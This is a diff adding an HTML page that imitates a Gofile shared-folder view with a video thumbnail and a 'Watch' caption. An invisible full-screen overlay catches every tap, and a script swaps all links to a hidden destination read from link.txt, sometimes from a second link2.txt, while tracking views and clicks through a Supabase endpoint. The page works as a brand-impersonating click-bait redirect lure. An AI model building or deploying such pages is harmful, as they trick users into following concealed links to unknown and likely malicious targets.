@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#162036">
+<title>Gofile</title>
+<meta property="og:title" content="星乃リア · Gofile">
+<meta property="og:image" content="https://click-click.site/Gofile.png">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="星乃リア · Gofile">
+<meta name="twitter:image" content="https://click-click.site/Gofile.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{min-height:100%;}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#162036;color:#cbd5e1;font-size:14px;-webkit-font-smoothing:antialiased;}
+.lc-go{cursor:pointer;}
+.lc-tapall{position:fixed;inset:0;z-index:9000;display:block;background:transparent;}
+/* Nav */
+.gf-wrap{max-width:100%;overflow-x:hidden;}
+.gf-nav{display:flex;align-items:center;gap:8px;padding:0 12px;height:56px;background:#162036;border-bottom:1px solid rgba(255,255,255,0.07);}
+.gf-nav-icon{width:36px;height:36px;display:flex;align-items:center;justify-content:center;color:#94a3b8;flex:0 0 auto;}
+.gf-nav-icon svg{width:20px;height:20px;}
+.gf-navtitle{font-size:20px;font-weight:700;color:#f1f5f9;padding:0 2px;flex:1;letter-spacing:-0.3px;}
+/* Ad */
+.gf-ad{padding:9px 16px;background:#162036;font-size:11px;color:#64748b;text-align:center;border-bottom:1px solid rgba(255,255,255,0.07);}
+.gf-ad a{color:#60a5fa;text-decoration:underline;text-underline-offset:2px;}
+/* Main content */
+.gf-main{padding:12px;display:flex;flex-direction:column;gap:8px;}
+/* Folder card */
+.gf-folder-card{background:#202c48;border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.08);}
+.gf-fc-row{display:flex;align-items:center;gap:12px;}
+.gf-folder-ico-wrap{width:40px;height:40px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.05);border-radius:10px;}
+.gf-folder-ico-wrap svg{width:24px;height:24px;}
+.gf-fc-body{flex:1;min-width:0;}
+.gf-fc-name{font-size:16px;font-weight:700;color:#f1f5f9;margin-bottom:4px;}
+.gf-fc-meta{display:flex;align-items:center;gap:6px;font-size:12.5px;color:#94a3b8;margin-bottom:4px;}
+.gf-fc-meta svg{width:12px;height:12px;flex:0 0 auto;}
+.gf-fc-items{display:flex;align-items:center;gap:6px;font-size:12.5px;color:#94a3b8;margin-bottom:9px;}
+.gf-fc-items svg{width:12px;height:12px;flex:0 0 auto;}
+.gf-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px 3px 7px;border-radius:999px;background:rgba(148,163,184,0.1);color:#b0bec5;font-size:12px;font-weight:500;border:1px solid rgba(148,163,184,0.25);}
+.gf-badge svg{width:12px;height:12px;}
+.gf-fc-acts{display:flex;gap:4px;align-items:center;flex:0 0 auto;}
+.gf-ibt{width:34px;height:34px;border-radius:8px;background:rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:center;cursor:pointer;border:1px solid rgba(255,255,255,0.1);}
+.gf-ibt svg{width:17px;height:17px;color:#94a3b8;}
+.gf-dots-btn{width:32px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#64748b;}
+.gf-dots-btn svg{width:18px;height:18px;}
+/* Toolbar */
+.gf-toolbar{background:#202c48;border-radius:12px;padding:11px 14px;display:flex;align-items:center;justify-content:space-between;border:1px solid rgba(255,255,255,0.08);}
+.gf-cb{display:flex;align-items:center;justify-content:center;color:#94a3b8;}
+.gf-tb-right{display:flex;gap:18px;align-items:center;}
+.gf-tb-right svg{width:16px;height:16px;color:#94a3b8;}
+/* File row */
+.gf-file{background:#202c48;border-radius:12px;overflow:hidden;border:1px solid rgba(255,255,255,0.08);}
+.gf-file-head{display:flex;align-items:center;gap:10px;padding:12px 14px 10px;}
+.gf-file-cb{flex:0 0 auto;color:#475569;line-height:0;}
+.gf-file-body{flex:1;min-width:0;}
+.gf-file-name{display:flex;align-items:center;gap:6px;font-size:14px;font-weight:500;color:#e2e8f0;margin-bottom:4px;overflow:hidden;}
+.gf-file-name-ico{flex:0 0 auto;line-height:0;}
+.gf-file-name-ico svg{width:20px;height:20px;display:block;}
+.gf-file-name-text{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.gf-file-meta{display:flex;align-items:center;gap:7px;font-size:12px;color:#94a3b8;}
+.gf-file-meta svg{width:11px;height:11px;flex:0 0 auto;}
+.gf-file-dots{width:28px;height:28px;display:flex;align-items:center;justify-content:center;flex:0 0 auto;color:#64748b;}
+.gf-file-dots svg{width:16px;height:16px;}
+.gf-thumb-wrap{display:block;margin:8px 20px 0;background:#000;aspect-ratio:16/9;position:relative;overflow:hidden;border-radius:8px;border:0.5px solid rgba(255,255,255,0.3);}
+.gf-thumb-wrap img{position:absolute;inset:0;width:100%;height:100%;object-fit:contain;}
+.gf-file-caption{padding:8px 14px 14px;font-size:12px;color:#475569;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+</style>
+</head>
+<body>
+<div class="gf-wrap">
+<nav class="gf-nav">
+  <div class="gf-nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h16"/><path d="M4 12h16"/><path d="M4 19h16"/></svg></div>
+  <span class="gf-navtitle">星乃リア</span>
+</nav>
+<div class="gf-ad">To disable ads, <a href="#" class="lc-go">upgrade</a> your account to Premium</div>
+<div class="gf-main">
+  <div class="gf-folder-card">
+    <div class="gf-fc-row">
+      <div class="gf-folder-ico-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 14 1.5-2.9A2 2 0 0 1 9.24 10H20a2 2 0 0 1 1.94 2.5l-1.54 6a2 2 0 0 1-1.95 1.5H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h3.9a2 2 0 0 1 1.69.9l.81 1.2a2 2 0 0 0 1.67.9H18a2 2 0 0 1 2 2v2"/></svg>
+      </div>
+      <div class="gf-fc-body">
+        <div class="gf-fc-name">星乃リア</div>
+        <div class="gf-fc-meta">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 2v3"/><path d="M16 2v3"/><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/></svg>
+          Aug 27, 2026 at 08:21 PM
+        </div>
+        <div class="gf-fc-items">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2h-4a2 2 0 0 0-2 2v11a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V8"/><path d="M16.706 2.706A2.4 2.4 0 0 0 15 2v5a1 1 0 0 0 1 1h5a2.4 2.4 0 0 0-.706-1.706z"/><path d="M5 7a2 2 0 0 0-2 2v11a2 2 0 0 0 2 2h8a2 2 0 0 0 1.732-1"/></svg>
+          3 items
+        </div>
+        <span class="gf-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
+          public
+        </span>
+      </div>
+      <div class="gf-fc-acts">
+        <a href="#" class="lc-go gf-ibt">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 15V3"/><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5"/></svg>
+        </a>
+        <div class="gf-dots-btn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="gf-toolbar">
+    <div class="gf-cb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="18" height="18"><path d="M21 10.656V19a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h12.344"/><path d="m9 11 3 3L22 4"/></svg></div>
+    <div class="gf-tb-right">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 5h20"/><path d="M6 12h12"/><path d="M9 19h6"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21 16-4 4-4-4"/><path d="M17 20V4"/><path d="m3 8 4-4 4 4"/><path d="M7 4v16"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 17H5"/><path d="M19 7h-9"/><circle cx="17" cy="17" r="3"/><circle cx="7" cy="7" r="3"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></svg>
+    </div>
+  </div>
+  <div class="gf-file">
+    <div class="gf-file-head">
+      <div class="gf-file-cb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="17" height="17"><rect width="18" height="18" x="3" y="3" rx="2"/></svg></div>
+      <div class="gf-file-body">
+        <div class="gf-file-name">
+          <span class="gf-file-name-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#fb7185" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"/><path d="M14 2v5a1 1 0 0 0 1 1h5"/><path d="M15.033 13.44a.647.647 0 0 1 0 1.12l-4.065 2.352a.645.645 0 0 1-.968-.56v-4.704a.645.645 0 0 1 .967-.56z"/></svg></span>
+          <span class="gf-file-name-text">星乃リア · Gofile</span>
+        </div>
+        <div class="gf-file-meta">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 2v3"/><path d="M16 2v3"/><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/></svg>
+          Aug 27, 2026 at 08:21 PM
+          <span style="margin:0 2px">·</span>
+          83.5 MB
+        </div>
+      </div>
+      <div class="gf-file-dots">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg>
+      </div>
+    </div>
+    <a href="#" class="lc-go gf-thumb-wrap">
+      <img src="https://click-click.site/a/20260925_2354/thumb.jpg" alt="">
+    </a>
+    <div class="gf-file-caption">Watch 星乃リア · Gofile 2026_08_27_2021</div>
+  </div>
+</div>
+</div>
+<a href="#" class="lc-go lc-tapall" aria-label="星乃リア · Gofile"></a>
+<script>
+(function() {
+  var SB = 'https://qvttkbjxnvsbufaxqpkj.supabase.co';
+  var KEY = 'sb_publishable_Ab6lztc5Y2BHT7IRXXrzMg_soFsDudr';
+  var PATH = 'a/20260925_2354';
+  var HAS_ALT = true;
+  var PREVIEW = false;
+  var PREVIEW_URL = "";
+  var PREVIEW_ALT = "";
+  function rpc(fn) {
+    if (PREVIEW) return;
+    fetch(SB + '/rest/v1/rpc/' + fn, {
+      method: 'POST',
+      headers: { apikey: KEY, Authorization: 'Bearer ' + KEY, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ p_path: PATH }),
+      keepalive: true
+    }).catch(function(){});
+  }
+  function fetchCt() {
+    return fetch(SB + '/rest/v1/stats?path=eq.' + encodeURIComponent(PATH) + '&select=ct', {
+      headers: { apikey: KEY, Authorization: 'Bearer ' + KEY }
+    }).then(function(r){ return r.json(); })
+      .then(function(rows){ return (rows[0] && rows[0].ct) || 0; })
+      .catch(function(){ return 0; });
+  }
+  rpc('increment_pv');
+  var linkP = PREVIEW ? Promise.resolve(PREVIEW_URL) : fetch('./link.txt').then(function(r){ return r.text(); }).then(function(t){ return t.trim(); }).catch(function(){ return ''; });
+  var altP  = PREVIEW ? Promise.resolve(PREVIEW_ALT) : (HAS_ALT ? fetch('./link2.txt').then(function(r){ return r.text(); }).then(function(t){ return t.trim(); }).catch(function(){ return ''; }) : Promise.resolve(''));
+  Promise.all([linkP, altP, (!PREVIEW && HAS_ALT) ? fetchCt() : Promise.resolve(0)]).then(function(vals) {
+    var url = vals[0], altUrl = vals[1], ct = vals[2];
+    if (!url) return;
+    var target = (altUrl && !PREVIEW && ct > 200 && Math.random() < 0.1) ? altUrl : url;
+    var gos = document.querySelectorAll('.lc-go');
+    for (var i = 0; i < gos.length; i++) gos[i].href = target;
+  });
+  var sent = false;
+  function track() {
+    if (sent) return;
+    sent = true;
+    rpc('increment_ct');
+  }
+  var gos = document.querySelectorAll('.lc-go');
+  for (var j = 0; j < gos.length; j++) {
+    gos[j].addEventListener('click', track, { capture: true });
+  }
+  document.addEventListener('touchstart', function(e) {
+    if (e.target.closest && e.target.closest('.lc-go')) track();
+  }, { passive: true, capture: true });
+})();
+</script>
+</body>
+</html>
